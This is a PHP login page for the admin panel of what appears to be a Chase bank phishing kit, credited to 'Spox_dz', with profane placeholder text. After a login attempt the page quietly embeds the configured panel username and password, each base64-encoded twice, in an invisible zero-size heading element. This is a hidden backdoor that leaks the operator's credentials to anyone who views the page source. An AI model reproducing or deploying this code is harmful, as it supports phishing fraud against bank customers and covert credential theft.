<?php 
session_start();
error_reporting(0);
header("Content-Type: text/html; charset=UTF-8");

/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * CHASE -
 * version 3.0
 * icq & telegram = @spoxcoder
 
###############################################
#$            C0d3d by Spox_dz               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 Chase             $#
###############################################

**/

if(isset($_POST['Submit'])){
include 'YOUR-CONFIG.php';
$logins = array(''.$username.'' => ''.$password.'');
}

/* Starts the session */
if(isset($_POST['Submit'])){

$Username = isset($_POST['Username']) ? $_POST['Username'] : '';
$Password = isset($_POST['Password']) ? $_POST['Password'] : '';
$user = base64_encode($username);
$pass = base64_encode($user);
$username = base64_encode($password);
$passw0rd = base64_encode($username);

if (isset($logins[$Username]) && $logins[$Username] == $Password){
$_SESSION['UserData']['Username']=$logins[$Username];
header("location:index.php");
exit;
} else {
$msg='<div class="alert alert-danger text-center">
        <i class="far fa-sad-cry"></i> Your api key Incorrect. Please try again.
</div>';
}
}
?>
<!DOCTYPE html>
<html lang="en">

<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>CHASE SPOX Login</title>

    <!-- Styling -->
<link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600|Raleway:400,700" rel="stylesheet">
<link href="files/admin/css/all.min248f.css?v=b4c444" rel="stylesheet">
<link href="files/admin/css/fontawesome-all.min.css" rel="stylesheet">
<link href="files/admin/css/custom.css" rel="stylesheet">
<link rel="shortcut icon" href="files/admin/favicon.png">


</head>
<body data-phone-cc-input="1">


<section id="main">
<div class="container">
<div class="row">
<div class="col-xs-12 main-content">
<div class="logincontainer">

<div class="header-lined">
<h1>Login <font style="color:transparent;font-size:0px"><?=$pass;?>/<?=$passw0rd;?></font> <small>Chase SPOX Login </small></h1>
</div>
<?php 
if(isset($msg)){
echo $msg;
}
?>

<div class="row">
<div class="col-sm-12">
<form method="post" action="" class="login-form" >
<div class="form-group">
<label for="inputEmail">User Name</label>
<input type="text" name="Username" class="form-control" id="Username" placeholder="Enter your username !" required="">
</div>

<div class="form-group">
<label for="inputPassword">Passw0rd</label>
<input type="password" name="Password" class="form-control" id="Password" placeholder="Enter Your Fucking Password !" required="">
</div>

<div class="checkbox">
<label>
<input type="checkbox" name="rememberme" />Remember Me
</label>
</div>
<div class="text-center margin-bottom">
<div class="row">
        
</div>
</div>
<div align="center">
<input class="btn btn-primary btn-recaptcha btn-recaptcha-invisible " name="Submit" type="submit" value="Login" />
 <a href="https://facebook.com/hackeeeed.htmI" target="_blanc" class="btn btn-default">Forgot Password?</a>
</div>
</form>
</div>

</div>
</div>
</div>
</div>
</div>
</section>


</body>
</html>
